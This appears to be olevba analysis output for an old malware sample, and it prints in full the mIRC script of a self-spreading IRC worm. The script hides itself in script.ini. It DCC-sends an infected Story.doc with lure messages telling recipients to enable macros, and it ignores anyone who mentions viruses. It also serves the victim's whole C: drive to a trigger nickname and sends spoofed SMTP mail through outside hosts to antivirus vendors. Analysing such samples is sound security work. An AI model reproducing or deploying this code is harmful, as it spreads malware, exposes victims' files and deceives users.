olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Story
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Story 
in file: Virus.MSWord.Story - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[script]
n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }
n1=On 1:Input:*:{ Set %var1 $1- | If ( $upper(%var1) = /BY ) { .echo 1Mirc Worm 4Jack-In-The-Box | .echo 12<9<12<9By SimpleSimon12>9>12> | halt } }
n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }
n3=On 1:Unotify: .clear -s
n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }
n5=On 1:Filercvd:*.*: If ( $me != $nick ) { .dcc send $nick C:\Windows\Story.doc }
n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }
n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\
n8=On 1:Text:*script*:*: .ignore $nick
n9=On 1:Text:*worm*:*: .ignore $nick
n10=On 1:Text:*virus*:*: .ignore $nick
n11=On 1:Text:*infect*:*: .ignore $nick
n12=On 1:Text:*Jack*Box*:*: .ignore $nick
n13=On 1:Text:*macro*:*: .ignore $nick
n14=On 1:Text:*Story.doc*: .ignore $nick
n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }
n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }
n17=On 1:Text:*Hey*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }
n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }
n19=On 1:Sockopen:virc:{ Unset %var2 | Unset %var4 | Unset %var6 | Set %var1 $rand(3, 8) + 1 | Set %loop 1 | Set %var3 0 | :check1 | If ( %loop = %var1 ) { goto out } | If ( %var3 = 0 ) { Set %var2 %var2 $rand(A, Z) } | If ( %var3 = 1 ) { Set %var4 %var4 $rand(A, Z) } | If ( %var3 = 2 ) { Set %var6 %var6 $rand(A, Z) } | If ( %var3 = 2 ) && ( $rand(1, 3) = 2 ) { Set %var6 %var6 $chr(225) } | inc %loop | goto check1 | :out | If ( %var3 = 0 ) { Set %var3 1 | Set %var1 $rand(3, 8) | Set %loop 1 | goto check1 } | If ( %var3 = 1 ) { Set %var3 2 | Set %var1 $rand(5, 50) | Set %loop 1 | goto check1 } | Set %var2 $remove(%var2, $chr(32) ) | Set %var4 $remove(%var4, $chr(32) ) | Set %var5 %var2 @ %var4 .com | Set %var5 $remove(%var5, $chr(32) ) | Set %var6 $remove(%var6, $chr(32) ) | Set %var6 $replace(%var6, $chr(225), $chr(32) ) | If ( %var7 = 6 ) { .sockwrite -n virc Helo %var2 } | .sockwrite -n virc mail from: %var5
n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }
n21=On 1:Disconnect:{ If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini } | If ( $exists(C:\Windows\script1.ini) = $true ) { .copy C:\Windows\script1.ini C:\mirc\script.ini | .remove C:\Windows\script1.ini } }
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

